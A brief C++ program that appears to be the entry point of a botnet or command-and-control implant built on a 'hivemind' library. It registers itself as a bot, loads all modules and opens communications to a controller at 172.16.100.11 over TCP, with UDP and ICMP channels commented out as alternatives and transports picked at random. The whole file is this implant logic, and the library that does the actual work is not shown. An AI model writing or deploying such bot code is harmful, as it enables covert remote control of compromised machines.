#include "hivemind.h"

int main() {
  hivemind_lib::Init();
  hivemind_lib::AddTransport("TCP", "172.16.100.11", "1234");
//  hivemind_lib::AddTransport("UDP", "172.16.100.11", "1234");
//  hivemind_lib::AddTransport("ICMP", "172.16.100.11", "1234");
  hivemind_lib::SetTransportSelectionMethod(hivemind_lib::RANDOM);
  hivemind_lib::AddModule("ALL");
  hivemind_lib::RegisterBot();
  hivemind_lib::BeginComms();
  return 0;
}